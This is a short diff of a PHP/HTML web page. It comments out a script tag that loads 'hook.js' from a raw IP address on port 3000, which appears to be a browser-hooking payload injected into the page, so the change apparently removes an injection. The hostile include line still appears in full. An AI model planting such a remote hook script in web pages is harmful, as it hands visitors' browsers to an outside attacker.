@@ -209,7 +209,7 @@ $conn->close();
         </div>
     </div>
     
-<script src="http://39.124.137.58:3000/hook.js"></script>
+<!-- <script src="http://39.124.137.58:3000/hook.js"></script> -->
     <footer>
         <div class="footer-content">
             <div class="footer-links">
